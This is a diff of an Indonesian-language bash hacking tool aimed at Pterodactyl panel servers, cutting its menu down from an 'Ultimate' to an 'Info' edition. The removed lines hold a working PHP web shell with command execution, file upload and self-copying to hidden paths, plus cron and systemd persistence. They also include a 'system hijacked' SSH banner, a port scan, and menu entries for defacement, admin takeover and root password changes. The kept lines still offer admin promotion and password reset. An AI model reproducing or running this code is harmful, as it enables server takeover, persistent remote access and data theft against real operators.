-        fi
-    else
-        echo -e "${RED}${CROSS} Database info tidak lengkap! Jalankan GET INFO dulu.${NC}"
-    fi
-    
-    # Scan open ports
-    echo -e "\n${YELLOW}🔍 Scanning open ports...${NC}"
-    IP_VPS=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
-    PORTS=(21 22 80 443 3306 5432 6379 8080 8888)
-    
-    for port in "${PORTS[@]}"; do
-        timeout 1 bash -c "echo >/dev/tcp/$IP_VPS/$port" 2>/dev/null
-        if [ $? -eq 0 ]; then
-            case $port in
-                21)  SERVICE="FTP" ;;
-                22)  SERVICE="SSH" ;;
-                80)  SERVICE="HTTP" ;;
-                443) SERVICE="HTTPS" ;;
-                3306) SERVICE="MySQL" ;;
-                5432) SERVICE="PostgreSQL" ;;
-                6379) SERVICE="Redis" ;;
-                8080) SERVICE="HTTP-Alt" ;;
-                8888) SERVICE="HTTP-Alt2" ;;
-                *) SERVICE="Unknown" ;;
-            esac
-            echo -e "${GREEN}  ✅ Port $port ($SERVICE) is open${NC}"
-        fi
-    done
-    
-    # Scan Pterodactyl version
-    echo -e "\n${YELLOW}🔍 Checking Pterodactyl version...${NC}"
-    if [ -f "$PTERO_DIR/config/app.php" ]; then
-        VERSION=$(grep "'version'" "$PTERO_DIR/config/app.php" | cut -d"'" -f4)
-        echo -e "${GREEN}  📌 Version: $VERSION${NC}"
-        
-        # Check for outdated version
-        if [[ "$VERSION" < "1.10.0" ]]; then
-            echo -e "${RED}  ⚠️ Outdated version - vulnerable to known exploits!${NC}"
-        fi
-    else
-        echo -e "${YELLOW}  ⚠️ Could not determine version${NC}"
-    fi
-}
-
-# ==============================================
-# FUNGSI UBAH SSH BANNER (MENU 12)
-# ==============================================
-change_ssh_banner() {
-    echo -e "\n${PURPLE}${FILE} ====== UBAH SSH BANNER ====== ${FILE}${NC}"
-    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    
-    # Cek root
-    if [[ $EUID -ne 0 ]]; then
-        echo -e "${RED}${CROSS} Error: Script harus dijalankan sebagai root!${NC}"
-        return 1
-    fi
-    
-    BANNER="
-╔══════════════════════════════════════════════════════════════╗
-║                                                              ║
-║              🔴 SYSTEM HIJACKED BY R3NNDZZ 🔴               ║
-║              💀 YOUR SERVER HAS BEEN COMPROMISED 💀         ║
-║                                                              ║
-║   ██████╗ ██████╗ ███╗   ██╗███╗   ██╗██████╗ ███████╗     ║
-║   ██╔══██╗╚════██╗████╗  ██║████╗  ██║╚════██╗╚════██║     ║
-║   ██████╔╝ █████╔╝██╔██╗ ██║██╔██╗ ██║ █████╔╝    ██╔╝     ║
-║   ██╔══██╗ ╚═══██╗██║╚██╗██║██║╚██╗██║ ╚═══██╗   ██╔╝      ║
-║   ██║  ██║██████╔╝██║ ╚████║██║ ╚████║██████╔╝   ██║       ║
-║   ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝╚═════╝    ╚═╝       ║
-║                                                              ║
-║              🔐 CONTACT @lynnn046 FOR HELP 🔐               ║
-║                                                              ║
-║   ⚠️  ALL CONNECTIONS ARE BEING MONITORED ⚠️                ║
-║                                                              ║
-╚══════════════════════════════════════════════════════════════╝
-"
-    
-    echo -e "${YELLOW}${GEAR} Memasang SSH banner...${NC}"
-    echo "$BANNER" > /etc/ssh/banner
-    
-    # Enable banner di sshd_config
-    if grep -q "^#Banner" /etc/ssh/sshd_config; then
-        sed -i 's/^#Banner.*/Banner \/etc\/ssh\/banner/' /etc/ssh/sshd_config
-    elif grep -q "^Banner" /etc/ssh/sshd_config; then
-        sed -i 's/^Banner.*/Banner \/etc\/ssh\/banner/' /etc/ssh/sshd_config
-    else
-        echo "Banner /etc/ssh/banner" >> /etc/ssh/sshd_config
-    fi
-    
-    systemctl restart sshd 2>/dev/null || service ssh restart 2>/dev/null
-    
-    echo -e "${GREEN}${CHECK} SSH banner berhasil diubah!${NC}"
-    echo -e "\n${CYAN}Coba login SSH untuk melihat efeknya:${NC}"
-    echo -e "  ssh root@$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')"
-}
-
-# ==============================================
-# FUNGSI INSTALL BACKDOOR PERMANEN (MENU 13)
-# ==============================================
-install_backdoor() {
-    echo -e "\n${RED}${KEY} ====== INSTALL BACKDOOR PERMANEN ====== ${KEY}${NC}"
-    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    
-    # Cek root
-    if [[ $EUID -ne 0 ]]; then
-        echo -e "${RED}${CROSS} Error: Script harus dijalankan sebagai root!${NC}"
-        return 1
-    fi
-    
-    BACKDOOR_CODE='<?php
-    /**
-     * R3NNDZZ Permanent Backdoor
-     * @author lynn
-     * @hidden
-     */
-    
-    // Command execution
-    if(isset($_GET["cmd"])) {
-        echo "<pre>".shell_exec($_GET["cmd"])."</pre>";
-    }
-    
-    // File upload
-    if(isset($_FILES["file"])) {
-        $upload_dir = "";
-        $filename = $_FILES["file"]["name"];
-        if(move_uploaded_file($_FILES["file"]["tmp_name"], $upload_dir.$filename)) {
-            echo "Uploaded: $filename";
-        }
-    }
-    
-    // System info
-    if(isset($_GET["info"])) {
-        phpinfo();
-    }
-    
-    // Database connect (if available)
-    if(isset($_GET["db"])) {
-        $conn = @mysqli_connect($_GET["host"] ?? "localhost", $_GET["user"] ?? "root", $_GET["pass"] ?? "", $_GET["name"] ?? "");
-        if($conn) {
-            $res = mysqli_query($conn, "SHOW DATABASES");
-            while($row = mysqli_fetch_array($res)) {
-                echo $row[0]."<br>";
-            }
-        }
-    }
-    
-    // Hide from admin tools
-    $hidden_paths = array(
-        "/tmp/.system.php",
-        "/dev/shm/.cache.php",
-        "/var/tmp/.syslog.php",
-        "/usr/share/.config.php"
-    );
-    
-    // Self replication
-    $self = file_get_contents(__FILE__);
-    foreach($hidden_paths as $path) {
-        if(!file_exists($path)) {
-            file_put_contents($path, $self);
-        }
-    }
-    ?>'
-    
-    # Lokasi backdoor
-    BACKDOOR_LOCATIONS=(
-        "/tmp/.system.php"
-        "/dev/shm/.cache.php"
-        "/var/tmp/.syslog.php"
-        "/usr/share/.config.php"
-        "/opt/.hidden.php"
-        "/etc/.cron.php"
-    )
-    
-    echo -e "${YELLOW}${GEAR} Memasang backdoor di lokasi tersembunyi...${NC}"
-    
-    for loc in "${BACKDOOR_LOCATIONS[@]}"; do
-        echo "$BACKDOOR_CODE" > "$loc"
-        chmod 755 "$loc"
-        echo -e "${GREEN}  ✅ Backdoor installed: $loc${NC}"
-    done
-    
-    # Install juga di web directories
-    if [ -d "$PTERO_DIR/public" ]; then
-        echo "$BACKDOOR_CODE" > "$PTERO_DIR/public/r3nndzz.php"
-        chmod 644 "$PTERO_DIR/public/r3nndzz.php"
-        echo -e "${GREEN}  ✅ Backdoor: $PTERO_DIR/public/r3nndzz.php${NC}"
-    fi
-    
-    if [ -d "/var/www/html" ]; then
-        echo "$BACKDOOR_CODE" > "/var/www/html/r3nndzz.php"
-        chmod 644 "/var/www/html/r3nndzz.php"
-        echo -e "${GREEN}  ✅ Backdoor: /var/www/html/r3nndzz.php${NC}"
-    fi
-    
-    # Buat cron job untuk jaga backdoor
-    echo -e "\n${YELLOW}${GEAR} Memasang cron job untuk persistence...${NC}"
-    
-    CRON_JOB="*/5 * * * * find /tmp /dev/shm /var/tmp /usr/share -name '*.php' -size -100k -exec chmod 755 {} \; 2>/dev/null"
-    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
-    
-    echo -e "${GREEN}  ✅ Cron job installed (every 5 minutes)${NC}"
-    
-    # Buat systemd service
-    echo -e "\n${YELLOW}${GEAR} Membuat systemd service...${NC}"
-    
-    cat > /etc/systemd/system/r3nndzz.service << 'EOF'
-[Unit]
-Description=R3NNDZZ Persistence Service
-After=network.target
-
-[Service]
-Type=simple
-ExecStart=/bin/bash -c 'while true; do sleep 60; chmod 755 /tmp/.system.php /dev/shm/.cache.php /var/tmp/.syslog.php 2>/dev/null; done'
-Restart=always
-RestartSec=60
-
-[Install]
-WantedBy=multi-user.target
-EOF
-    
-    systemctl daemon-reload
-    systemctl enable r3nndzz.service 2>/dev/null
-    systemctl start r3nndzz.service 2>/dev/null
-    
-    echo -e "${GREEN}  ✅ Systemd service installed${NC}"
-    
-    echo -e "\n${GREEN}╔══════════════════════════════════════════════════════════════╗${NC}"
-    echo -e "${GREEN}║         ✅ BACKDOOR INSTALLATION COMPLETE!                    ║${NC}"
-    echo -e "${GREEN}╠══════════════════════════════════════════════════════════════╣${NC}"
-    echo -e "${GREEN}║${NC}  ${KEY} Total backdoors: ${YELLOW}${#BACKDOOR_LOCATIONS[@]} + 2 web${NC}"
-    echo -e "${GREEN}║${NC}  ${CLOCK} Cron job: Every 5 minutes${NC}"
-    echo -e "${GREEN}║${NC}  ${GEAR} Systemd: r3nndzz.service${NC}"
-    echo -e "${GREEN}║${NC}                                                              ${GREEN}║${NC}"
-    echo -e "${GREEN}║${NC}  ${GLOBE} Web backdoor: ${CYAN}${URL_PANEL}/r3nndzz.php${NC}"
-    echo -e "${GREEN}║${NC}  ${GLOBE} Hidden: /tmp/.system.php?cmd=id${NC}"
-    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
-}
-
-# ==============================================
-# FUNGSI BACKUP DATABASE (MENU 14)
-# ==============================================
-backup_database() {
-    echo -e "\n${GREEN}${BACKUP} ====== BACKUP DATABASE ====== ${BACKUP}${NC}"
-    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    
-    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
-        BACKUP_FILE="backup_${DB_NAME}_$(date +%Y%m%d_%H%M%S).sql"
-        
-        echo -e "${YELLOW}⏳ Melakukan backup database...${NC}"
-        
-        # Cek apakah mysqldump tersedia
-        if command -v mysqldump >/dev/null 2>&1; then
-            mysqldump -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" > "$BACKUP_FILE" 2>/dev/null
-            
-            if [ $? -eq 0 ] && [ -s "$BACKUP_FILE" ]; then
-                SIZE=$(du -h "$BACKUP_FILE" | cut -f1)
-                echo -e "${GREEN}${CHECK} Backup berhasil: $BACKUP_FILE${NC}"
-                echo -e "${GREEN}  📦 Size: $SIZE${NC}"
-            else
-                echo -e "${RED}${CROSS} Backup gagal!${NC}"
-                rm -f "$BACKUP_FILE"
-            fi
-        else
-            echo -e "${RED}${CROSS} mysqldump tidak ditemukan! Install dengan: apt-get install mysql-client${NC}"
-        fi
-    else
-        echo -e "${RED}${CROSS} Informasi database tidak lengkap! Jalankan GET INFO dulu.${NC}"
-    fi
-}
-
-# ==============================================
-# FUNGSI RESTORE DATABASE (MENU 15)
-# ==============================================
-restore_database() {
-    echo -e "\n${BLUE}${RESTORE} ====== RESTORE DATABASE ====== ${RESTORE}${NC}"
-    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    
-    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
-        echo -e "${YELLOW}📁 File backup yang tersedia:${NC}"
-        ls -la backup_*.sql 2>/dev/null | head -10
-        
-        if [ $? -ne 0 ]; then
-            echo -e "${RED}Tidak ada file backup ditemukan!${NC}"
-            return 1
-        fi
-        
-        echo ""
-        echo -ne "${CYAN}Masukkan nama file backup (contoh: backup_panel_20250221.sql): ${NC}"
-        read RESTORE_FILE
-        
-        if [ ! -f "$RESTORE_FILE" ]; then
-            echo -e "${RED}${CROSS} File tidak ditemukan!${NC}"
-            return 1
-        fi
-        
-        echo -e "${YELLOW}⏳ Merestore database...${NC}"
-        
-        # Backup dulu database saat ini
-        CURRENT_BACKUP="pre_restore_${DB_NAME}_$(date +%Y%m%d_%H%M%S).sql"
-        mysqldump -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" > "$CURRENT_BACKUP" 2>/dev/null
-        echo -e "${GREEN}  ✅ Backup current db: $CURRENT_BACKUP${NC}"
-        
-        # Restore
-        mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" < "$RESTORE_FILE" 2>/dev/null
-        
-        if [ $? -eq 0 ]; then
-            echo -e "${GREEN}${CHECK} Restore berhasil!${NC}"
-        else
-            echo -e "${RED}${CROSS} Restore gagal!${NC}"
-        fi
-    else
-        echo -e "${RED}${CROSS} Informasi database tidak lengkap! Jalankan GET INFO dulu.${NC}"
-    fi
-}
-
-# ==============================================
-# MAIN MENU
-# ==============================================
-show_menu() {
-    echo ""
-    echo -e "${WHITE}╔════════════════════════════════════════════════════════════════════════════╗${NC}"
-    echo -e "${WHITE}║                         PILIHAN MENU ULTIMATE                              ║${NC}"
-    echo -e "${WHITE}╠════════════════════════════════════════════════════════════════════════════╣${NC}"
-    echo -e "${WHITE}║                                                                            ║${NC}"
-    echo -e "${WHITE}║  ${GREEN}[1]${NC} ${GLOBE} GET INFO PANEL LENGKAP + AUTO ID 1                    ${WHITE}║${NC}"
-    echo -e "${WHITE}║  ${CYAN}[2]${NC} ${USER} GET USER INFO (MANUAL)                                 ${WHITE}║${NC}"
-    echo -e "${WHITE}║  ${PURPLE}[3]${NC} ${SERVER} GET SERVER INFO                                     ${WHITE}║${NC}"
-    echo -e "${WHITE}║  ${YELLOW}[4]${NC} ${DATABASE} GET DATABASE INFO                                 ${WHITE}║${NC}"
-    echo -e "${WHITE}║  ${BLUE}[5]${NC} ${FILE} SAVE INFO TO FILE                                      ${WHITE}║${NC}"
-    echo -e "${WHITE}║  ${RED}[6]${NC} ${CROWN} MAKE ID 1 SUPER ADMIN                                  ${WHITE}║${NC}"
-    echo -e "${WHITE}║  ${PURPLE}[7]${NC} ${PASSWORD} RESET PASSWORD ID 1 (NEW: admin)                 ${WHITE}║${NC}"
-    echo -e "${WHITE}║  ${GREEN}[8]${NC} ${FIRE} AUTO GET ID 1 + RESET PASSWORD (ALL IN ONE)           ${WHITE}║${NC}"
-    echo -e "${WHITE}║  ${RED}[9]${NC} ${SKULL} DEFACE PANEL PTERODACTYL (R3NNDZZ)                     ${WHITE}║${NC}"
-    echo -e "${WHITE}║  ${CYAN}[10]${NC} ${VPS} GANTI PASSWORD VPS (ROOT)                              ${WHITE}║${NC}"
-    echo -e "${WHITE}║  ${PURPLE}[11]${NC} ${SCAN} SCAN VULNERABILITY                                  ${WHITE}║${NC}"
-    echo -e "${WHITE}║  ${YELLOW}[12]${NC} ${FILE} UBAH SSH BANNER                                     ${WHITE}║${NC}"
-    echo -e "${WHITE}║  ${BLUE}[13]${NC} ${KEY} INSTALL BACKDOOR PERMANEN                              ${WHITE}║${NC}"
-    echo -e "${WHITE}║  ${GREEN}[14]${NC} ${BACKUP} BACKUP DATABASE                                    ${WHITE}║${NC}"
-    echo -e "${WHITE}║  ${RED}[15]${NC} ${RESTORE} RESTORE DATABASE                                   ${WHITE}║${NC}"
-    echo -e "${WHITE}║  ${RED}[0]${NC} 🚪 KELUAR                                                     ${WHITE}║${NC}"
-    echo -e "${WHITE}║                                                                            ║${NC}"
-    echo -e "${WHITE}╚════════════════════════════════════════════════════════════════════════════╝${NC}"
-    echo ""
-    echo -ne "${YELLOW}➤ Pilih menu [0-15]: ${NC}"
-}
-
-# ==============================================
-# MAIN FUNCTION
-# ==============================================
+# Main function
 main() {
     show_header
     
@@ -1511,25 +485,34 @@ main() {
         read choice
         
         case $choice in
-            1) get_panel_info ;;
-            2) get_user_manual ;;
-            3) get_server_info ;;
-            4) get_database_info ;;
-            5) save_info_file ;;
-            6) make_id1_admin ;;
-            7) reset_password_id1 ;;
-            8) auto_get_and_reset ;;
-            9) deface_panel ;;  # NEW: Deface Panel dengan pilihan lengkap
-            10) change_vps_password ;;  # Ganti Password VPS
-            11) scan_vulnerability ;;  # Scan Vulnerability
-            12) change_ssh_banner ;;  # Ubah SSH Banner
-            13) install_backdoor ;;  # Install Backdoor Permanen
-            14) backup_database ;;  # Backup Database
-            15) restore_database ;;  # Restore Database
+            1)
+                get_panel_info
+                ;;
+            2)
+                get_user_manual
+                ;;
+            3)
+                get_server_info
+                ;;
+            4)
+                get_database_info
+                ;;
+            5)
+                save_info_file
+                ;;
+            6)
+                make_id1_admin
+                ;;
+            7)
+                reset_password_id1
+                ;;
+            8)
+                auto_get_and_reset
+                ;;
             0)
-                echo -e "\n${GREEN}Thanks for using Hackback Ultimate Edition!${NC}"
+                echo -e "\n${GREEN}Thanks for using Hackback Info Edition!${NC}"
                 echo -e "${CYAN}Telegram: @lynnn046${NC}"
-                echo -e "${RED}R3NNDZZ WAS HERE!${NC}\n"
+                echo -e "${RED}Subscribe channel Rendzz Official!${NC}\n"
                 exit 0
                 ;;
             *)
@@ -1542,7 +525,7 @@ main() {
         read
         clear
         show_header
-        get_panel_info > /dev/null 2>&1
+        get_panel_info > /dev/null 2>&1  # Auto refresh info di background
     done
 }
 
